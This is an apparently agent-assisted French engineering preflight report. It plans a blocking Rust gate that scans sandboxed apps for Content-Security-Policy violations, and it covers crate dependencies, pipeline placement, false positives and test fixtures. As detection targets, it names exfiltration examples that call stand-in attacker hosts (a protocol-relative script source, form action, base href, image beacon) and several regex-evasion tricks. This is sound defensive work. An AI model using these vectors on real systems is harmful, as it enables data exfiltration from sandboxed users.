# Sprint 79 — Preflight G8 Phase E

## Gate CSP deterministe Rust BLOQUANT + factorisation source CSP unique

- **Sprint** : 79 (Factory app-authoring)
- **Cas** : B (pre-code)
- **HEAD** : `070c7a9` — working tree propre
- **Phases livrees** : A (`9297f08`), B, C, D (`070c7a9`)
- **Methode** : Workflow ultracode `wf_92722726-c54` — 5 scans paralleles Opus 4.8 1M
  + verification adversariale (9 claims critiques, 0 refute) + synthese. S1a/S3 ayant
  renvoye des sorties placeholder, re-scannes en 2 Agent paralleles Opus 4.8
  (`afbe713798f3e5eea`, `af1155475f273f4f2`) — contenu reel integre ci-dessous.
- **Verdict** : **PLAN-ADAPT**

---

## 1. Contexte Phase E

Objectif (plan `sprint79_plan.md` L277-317) : **PROUVER mecaniquement** la conformite
sandbox d'une app authored, pas la documenter. Livrables :

1. **Factorisation source CSP unique** : exporter `BLOB_SERVE_CSP`
   (`crates/nexus-shell-daemon-core/src/blob_serve.rs:286`) + un MANIFESTE de regles
   machine-lisible derive d'elle. `check-csp.mjs` ET le gate Rust consomment ce
   manifeste. Corriger `check-csp.mjs:12` (commentaire `esm`->`umd` perime) +
   completer la detection avec `form-action`/`base-uri`.
2. **`run_gate_csp_authoring(workspace) -> GateResult`** en Rust dans
   `crates/sbfb-factory/src/gates.rs` (modele = `run_gate_fg5_sandbox:65`), important
   `BLOB_SERVE_CSP` (source de verite, jamais re-hardcode), reprenant les 13 regex
   NETWORK de `check-csp.mjs`, 3 tiers (authored / compiled / vendored), AJOUTANT les
   regles manquantes (`form-action`/`base-uri`/`object-src`/`frame-src`), tree-walk WalkDir.
3. **Wiring** dans le pipeline publish a cote FG5/FG6, FAIL=publish bloque.
4. **Test cross-crate** anti-drift : NETWORK couvre toutes les directives `'none'` de
   `BLOB_SERVE_CSP`.
5. **Doc** `docs/factory/FACTORY_GATES.md` : nouveau gate FG-CSP-authoring.

Day-0 gelees pertinentes : importer `BLOB_SERVE_CSP` jamais re-hardcode ; gate BLOQUANT
des son introduction ; gate DETERMINISTE (regex, pas de ML) ; **0 bump wire, 0 dep
nouvelle** ; scellage 100% Factory non-delegable ; daemon neutre.

---

## 2. Les 5 scans (resume + evidence)

### S1b — DESIGN-CONFLICT propose -> requalifie PLAN-ADAPT (coeur du preflight)

- **`sbfb-factory` ne depend PAS de `nexus-shell-daemon-core`.** Deps de chemin =
  `sbfb-manifest` + `nexus-core-rs` uniquement.
  Evidence VERIFIEE : `crates/sbfb-factory/Cargo.toml:12-13` ; le bloc `[dependencies]`
  L11-38 + `[dev-dependencies]` L40-44 ne contiennent AUCUN `nexus-shell-daemon-core`.
  Seuls `crates/nexus-launcher/Cargo.toml:27` et `crates/nexus-shell-daemon/Cargo.toml:21`
  le consomment. **(P1, impacts verdict)**
- **Importer `nexus-shell-daemon-core` ajoute 32 crates transitifs NOUVEAUX** :
  `comm -13` entre `cargo tree -p sbfb-factory` (404) et `-p nexus-shell-daemon-core`
  (396) = 32 extras dont `rusqlite` + `libsqlite3-sys` (compilation C SQLite bundled),
  `frost-ed25519`/`frost-core`/`frost-rerandomized`, `governor`+`quanta`, `sysinfo`+`ntapi`,
  `rayon`+`rayon-core`, `hmac`, `nexus-events-core`. Tension directe avec « 0 dep
  nouvelle » + « Factory hors daemon (v4 D2) ». **(P1, impacts verdict)**
- **La crainte « tirer iroh » est MOOT** : `sbfb-factory` compile DEJA toute la stack
  iroh 0.98/0.100 via `nexus-core-rs` (`Cargo.toml:13` -> `nexus-core-rs/Cargo.toml:19-22`).
  `iroh*` N'apparait PAS dans les 32 extras. Nuance de la verif adversariale : `nexus-core-rs`
  porte deja `notify/dashmap/iroh-blobs/tower/async-trait/chrono` transitivement, donc seuls
  `rusqlite/governor/sysinfo/hmac/frost-ed25519/rusqlite_migration` sont GENUINEMENT neufs.
  Le delta dep reste reel mais ne doit pas etre surcompte. **(INFO)**
- **Hote plus leger DEJA dep** : `nexus-core-rs` heberge deja `DOMAIN_PROVENANCE_V1`
  (`canonical.rs:110`, consommee `gates.rs:6`) ; Grep CSP dans `nexus-core-rs/src` = VIDE.
  Poser/re-exporter `BLOB_SERVE_CSP` y eviterait les 32 crates. **(re-classee P0->P3 par la
  verif adversariale : re-design d'un Day-0 gele, le CODE ne contredit pas le Day-0)**
- **Aucun cycle** : `nexus-shell-daemon-core` ne depend pas de `sbfb-*` ; `nexus-core-rs` non plus. **(INFO)**
- **`walkdir 2.5.0` + `regex 1.12.3` deja deps** de `sbfb-factory` (`Cargo.toml:19,25`),
  RUSTSEC clean ; `cargo-audit` non installe (verif statique). **(INFO)**
- **Wiring resolu : `pipeline.rs:15`** `run_publish_pipeline` cable reellement les gates
  (FG4 L23, FG5 L28, FG6 L37, FG8 L56) ; `publish.rs:14` ne fait que deleguer. **(INFO)**
- **TENSION skip_gates** : `pipeline.rs:27` `if !skip_gates {` englobe FG5+FG6. Inserer le gate
  CSP au meme endroit l'heriterait du bypass — contredit « aucune dispense ». **(P1, impacts verdict)**
- **GAP = DETECTION, pas chaine CSP** : `blob_serve.rs:286` declare deja `frame-src`/`object-src`/
  `base-uri`/`form-action 'none'`. Le commentaire `check-csp.mjs:3-13` cite une CSP INCOMPLETE
  -> ne pas le lire comme source. **(P2)**
- **Drift `check-csp.mjs:12`** ('anime.esm.js' vs l.75 lit 'vendor/anime.umd.js'). **(P3)**

### S2 — PLAN-ADAPT

- Historique CSP reconstruit (`4780c5a` -> `8712890` -> `0ee8cf4`). CONFIRME : les 4 directives
  dites « GAP » sont DEJA dans la chaine ; le travail Phase E est la DETECTION.
- **Conflit central** : v4 D2 materialise a `fork.rs:193-195` — `validate_zip_path` DUPLIQUE
  « so the client Factory stays decoupled from `nexus-shell-daemon-core`, per v4 D2 ». Un edge
  factory->daemon-core serait le PREMIER de ce type. **(P1)**
- Factorisation = travail RECONNU : `check-frontier-contracts.sh:38` note « per-directive CSP gate
  is the Sprint 79 Phase E/H scope » ; teste aujourd'hui par substring.
- Determinisme gele `FACTORY_GATES.md:205-206` (« Pas de composant ML, pas de scoring opaque »). VERIFIE.
- Modele verifiable-par-recalcul etabli : `tests/animejs_manifest.rs` (recompute blake3 par couche).
  Ce test lit les fichiers via `CARGO_MANIFEST_DIR`, n'importe PAS le crate.
- `check-csp.mjs` non branche CI (`package.json:11` script local).

### S4 — PLAN-ADAPT

- `BLOB_SERVE_CSP` = chaine EXACTE annoncee ; consommateur runtime unique `http.rs:556`. VERIFIE.
- **BLOCKER CABLAGE** confirme (edge interne nouveau, pas de cycle). **(P1)**
- **`sbfb-factory` est BINARY-ONLY** (aucun `lib.rs` ; `main.rs:14` `mod gates;`). VERIFIE par
  `ls crates/sbfb-factory/src/` (main.rs + 21 modules, pas de lib.rs). Le test cross-crate doit
  etre `#[cfg(test)]` inline dans `gates.rs`. **(P2)**
- Signature confirmee : `run_gate_xxx(workspace: &Path) -> Result<GateResult, FactoryError>` ;
  `GateResult{gate,passed,issues}` + `pass()`/`fail()` ; `WalkDir::new(canonical).follow_links(false)`.
  VERIFIE `gates.rs:11-34, 65-115`.
- `CSS_URL_ALLOW` (`check-csp.mjs:40-44`) = 2 URL `http://` (w3.org) + 1 `https://` (tailwindcss)
  -> le gate doit matcher les deux schemes. VERIFIE.
- Positive-assertions (`app.css` en `<link rel=stylesheet>` relatif, `vendor/*.js` classic
  `<script src>` jamais `type=module`) = travail NEUF, pas une regression. VERIFIE.
- 0 bump wire ; `examples/` hors workspace. VERIFIE.

### S1a — OSS prior-art (re-scan reel, `afbe713798f3e5eea`)

- **F1** : `csp-evaluator` (Google) evalue une *politique* CSP, PAS des assets — pas un prior-art
  direct. Aucun OSS ne fait « scanner des assets contre une politique fixe » → creneau legitime
  d'un gate maison, pas une dep. **(P3)**
- **F3** : recherche academique (Fakeium arxiv.org/pdf/2410.20862) — **~57% des sources ont >=1
  appel reseau cache trouve seulement en dynamique**. Le gate statique NE PEUT PAS etre une preuve
  de securite reseau ; il est bloquant pour la **discipline d'authoring**, l'autorite de conformite
  restant la CSP runtime + le self-check Phase H. **(P1)**
- **F4** : 4/7 classes de faux-negatifs (attribut `action`/`href` construit en JS, `fetch` via
  alias/`atob`/`new Function`, `<base>` injecte par innerHTML, CSS `url()` dynamique) sont
  STRUCTURELLEMENT hors de portee du regex → couvertes uniquement par Phase H runtime. **(P1)**
- **F6** : bug de portage latent — `check-csp.mjs:28-36` (primitives JS) n'a PAS `/i`, `:24-27`
  (HTML/CSS) l'a. En Rust : `(?i)` pour HTML/CSS (attributs/url insensibles), SANS `(?i)` pour les
  identifiants JS natifs (`fetch`!=`Fetch`), avec `\b` aux bornes (eviter `prefetcher`). **(P2)**
- **GAP REEL non couvert par check-csp.mjs** : URLs **protocol-relative** `<script src="//evil.com">`
  — remote mais ratees par tous les patterns `https?:` actuels. Matchables statiquement, peu couteux
  a fermer en Phase E (`["']//[a-z0-9.-]+/`). **(P2, scope-enrichment intra-intention)**
- **Reco** : scanner le **buffer entier** (pas ligne-a-ligne) pour le CSS minifie ; docstring honnete
  declarant gate-de-surface + autorite Phase H ; reproduire les 3 tiers (pas juste les 13 regex a plat).

### S3 — threat model (re-scan reel, `af1155475f273f4f2`)

- **F1** : la menace exfil-iframe est DEJA modelisee (`THREAT_MODEL.md:155-164` §5.1, mitigation
  livree `:317`) MAIS le gate **publish-time** n'a aucune entree (§13 Preview = exhaustion memoire
  seulement). → ajouter une sous-section §13.x. **(INFO, doc-gap)**
- **F2** : `connect-src 'none'` regit UNIQUEMENT le fetch programmatique. `<form action=https://attacker>`
  = navigation (pas connexion) → `form-action 'none'` la bloque. `<base href=https://attacker/>`
  detourne TOUTES les URL relatives → `base-uri 'none'` le bloque. Rationale verbatim `blob_serve.rs:283-285`. **(MEDIUM)**
- **F3** (thèse validee) : STATIQUE (publish, Factory) = defense du RESEAU + feedback auteur ;
  RUNTIME (blob-serve) = defense du CLIENT a l'execution. Ni redondant ni suffisant seul → defense
  en profondeur. **(INFO)**
- **F4** : nuance — sandbox `allow-scripts` SANS `allow-forms` bloque deja les form submit dans le
  shell. `form-action 'none'` est une **garantie portable** (independante du flag sandbox du client),
  pas « la seule barriere ». Ne pas sur-vendre. **(LOW)**
- **F6 (CRITIQUE faux-positifs)** : un gate BLOQUANT doit allowlister les `http(s)` non-fetchees
  ou il casse toute app daisyUI : xmlns SVG `http://www.w3.org/2000/svg`, xlink `http://www.w3.org/1999/xlink`,
  banniere licence `https://tailwindcss.com`, banniere `https://github.com/developit/htm`
  (`crates/sbfb-factory/src/templates/react/htm.umd.js:1`). **Si le gate applique le tier « authored
  strict » au CSS compile ou aux bundles vendored, il casse toutes les apps daisyUI/react.** Le gate
  DOIT reproduire `CSS_URL_ALLOW` + la distinction 3 tiers. Verif G-REVIEW obligatoire. **(MEDIUM)**
- **Rationale anti-exfiltration pret a copier dans `FACTORY_GATES.md`** (fourni par le scan, integre Phase E).
- **Q (carry Phase H / hors-scope)** : `BLOB_SERVE_CSP` n'a pas de `img-src` → `new Image().src=https://attacker/?data`
  retombe sur `default-src` (bloque runtime) mais invisible au statique si dynamique → reliance runtime+H.

---

## 3. Verification adversariale

Toutes les claims P0/P1 reproduites de visu sur HEAD `070c7a9` (9 verifs, 0 refute) :
`Cargo.toml:12-13` (deps factory, aucun daemon-core) — CONFIRME ; 32 crates transitifs —
liste CONFIRMEE (nuance surcompte ci-dessus) ; `iroh` MOOT — CONFIRME ; hote leger nexus-core-rs
— CONFIRME mais re-classe P0->P3 ; `fork.rs:193-195` v4 D2 — verbatim CONFIRME ; `skip_gates`
bypass `pipeline.rs:18,27`+`publish.rs:10,14`+`main.rs:108-110` — CONFIRME ; GAP detection —
CONFIRME ; binary-only — CONFIRME. **Aucune claim critique refutee.**

---

## 4. Verdict : PLAN-ADAPT

**Pourquoi pas EXECUTE** : la lettre du plan (« importer depuis `nexus-shell-daemon-core` ») n'est
pas executable sans ajouter ~6-32 crates transitifs et un edge qui collise avec deux Day-0 (« 0 dep
nouvelle » + v4 D2 « Factory hors daemon », materialisee `fork.rs:193-195`).

**Pourquoi pas DESIGN-CONFLICT** : aucune Day-0 d'INTENTION n'est contredite par le code. L'intention
gelee (kickoff Day-0 #4) est « importer `BLOB_SERVE_CSP`, jamais re-hardcode, factoriser en source
unique + test cross-crate » — SANS nom de crate. Le segment « `nexus-shell-daemon-core` » est une
formulation de Scope/narratif, pas un decret Day-0, et il entre lui-meme en collision avec deux autres
Day-0. Quand deux contraintes gelees se heurtent, la resolution qui les honore TOUTES avec evidence
Cargo concrete = PLAN-ADAPT, pas arbitrage user.

**Pourquoi pas SCOPE-CUT-CONSISTENT** : rien n'est deja fait ; tout le travail de detection est neuf.

---

## 5. Adaptations a suivre pendant le code

1. **Source de la const** — NE PAS ajouter l'edge `sbfb-factory -> nexus-shell-daemon-core`.
   Factoriser `BLOB_SERVE_CSP` (+ COOP/COEP au besoin) dans `nexus-core-rs` (deja dep commune,
   deja hote de `DOMAIN_PROVENANCE_V1` `canonical.rs:110`), et la **re-exporter** depuis
   `nexus-shell-daemon-core::blob_serve` (`pub use`) pour preserver le consommateur runtime unique
   `http.rs:556` SANS toucher ses call-sites. Le gate Rust importe `nexus_core_rs::...::BLOB_SERVE_CSP`.
   Honore les 3 Day-0 : importe la const canonique (jamais re-hardcode) + 0 crate transitif ajoute
   + Factory hors daemon.

2. **Manifeste de regles** — vit la ou vit la const (`nexus-core-rs`) : une representation Rust
   (directives `'none'` + leur traduction regex de detection + `CSS_URL_ALLOW`) consommee par le gate
   Rust, miroitee dans un `.json` versionne consomme par `check-csp.mjs`. Le test cross-crate parse la
   chaine CSP (split `;`, directives terminees par `'none'`) et asserte que chacune a une entree de
   detection dans le manifeste. Modele recompute : `tests/animejs_manifest.rs`.

3. **Emplacement test cross-crate** — `#[cfg(test)]` INLINE dans `gates.rs` (modele `gates.rs:249+`).
   PAS dans `tests/` : `sbfb-factory` est binary-only, aucun `lib.rs` a importer.

4. **Placement hors-bypass** — inserer `run_gate_csp_authoring` dans `pipeline.rs` HORS du bloc
   `if !skip_gates` (toujours execute, BLOQUANT : `return Err` sur `!passed`, modele FG5 l.30-34).
   Documenter dans `FACTORY_GATES.md` que ce gate ignore `--skip-gates` (non-delegable Day-0),
   contrairement a FG5/FG6.

5. **Fixtures de test** — TempDir + fichiers inline (modele `pipeline.rs:127-151`). Couvrir : authored
   fetch()/http absolu=FAIL ; `<form action>`/`<base href>`/`<object>`/`<iframe>`=FAIL (regles neuves) ;
   protocol-relative `//cdn`=FAIL ; app.css url() remote=FAIL + URL hors CSS_URL_ALLOW=FAIL ; vendor
   `type=module`=FAIL ; cas propre (xmlns SVG + banniere tailwindcss en CSS compile + vendor classic
   script)=PASS. CSS_URL_ALLOW = 2 `http://` + 1 `https://` → matcher les deux schemes. Delta vise +6 a +10.

6. **Corrections `check-csp.mjs`** — l.12 `esm`->`umd` ; completer l'entete CSP (l.3-13 incomplet) ;
   faire consommer le manifeste partage (`.json` derive) au lieu de re-hardcoder. Non branche CI
   (`package.json:11` local) → aucune regression pipeline.

7. **Robustesse regex (S1a F6 + protocol-relative)** — porter en Rust avec `(?i)` cote HTML/CSS,
   SANS `(?i)` cote identifiants JS natifs + `\b` aux bornes ; scanner le **buffer entier** (CSS minifie) ;
   AJOUTER la detection protocol-relative `//host` (gap reel). Granularite BLOCK : bloquer sur le reseau
   dur (13 primitives + remote `<link>/<script>` http(s) ou `//` + `@import` + remote `url()`) et les
   attributs HTML LITTERAUX `<form action=>`/`<base href>`/`<object>`/`<embed>`/`<iframe>`. Les heuristiques
   de construction dynamique (`.setAttribute('action'...`) restent best-effort — si elles induisent un
   risque de faux-positif sur du code legitime, l'autorite est Phase H runtime (decider a la lecture de
   `GateResult` : pas de tier WARN → privilegier la specificite haute pour eviter de bloquer une app saine).

8. **Faux-positifs (S3 F6, CRITIQUE)** — reproduire FIDELEMENT les 3 tiers de `check-csp.mjs` :
   *authored* {index.html, app.js} strict (0 http(s) absolu) ; *compiled* {app.css} (0 NETWORK + URL
   absolues ∈ CSS_URL_ALLOW) ; *vendored* {vendor/*.js} (primitives reseau seules, bannieres de licence
   preservees). Ne JAMAIS appliquer le tier strict au CSS compile ni aux bundles vendored.

9. **Docs** — `FACTORY_GATES.md` : rationale anti-exfiltration (fourni S3) + note « ignore --skip-gates »
   + determinisme. `THREAT_MODEL.md` §13.x : gate publish-time = defense reseau/distribution distincte
   de la mitigation runtime §5.1.

---

## 6. Invariants verifies tenus

- **0 bump wire** : aucun `*_VERSION`/`FEED_FORMAT_VERSION` touche (scope Phase E).
- **0 dep crates.io nouvelle** : `walkdir`/`regex` deja deps ; l'adaptation 1 evite tout crate
  transitif neuf (la const va dans `nexus-core-rs`, deja dep).
- **Daemon neutre** : aucune route daemon, aucune autorite de verdict ajoutee ; le gate vit 100%
  cote `sbfb-factory` (la const partagee vit dans `nexus-core-rs`, neutre).
- **Determinisme** : scan regex/statique pur, aucun ML/scoring (`FACTORY_GATES.md:205-206`).
- **Gate BLOQUANT des l'introduction** : place hors `skip_gates` (adaptation 4).
- **Source unique** : la const reste la verite, le manifeste en derive, test anti-drift cross-crate.
- **Connaissance/gate CONSOMME, jamais autoritaire au sens RRV** : un gate de conformite mecanique
  (pass/fail deterministe) n'emet pas de verdict de qualite RRV — il est dans la lignee FG5/FG6.
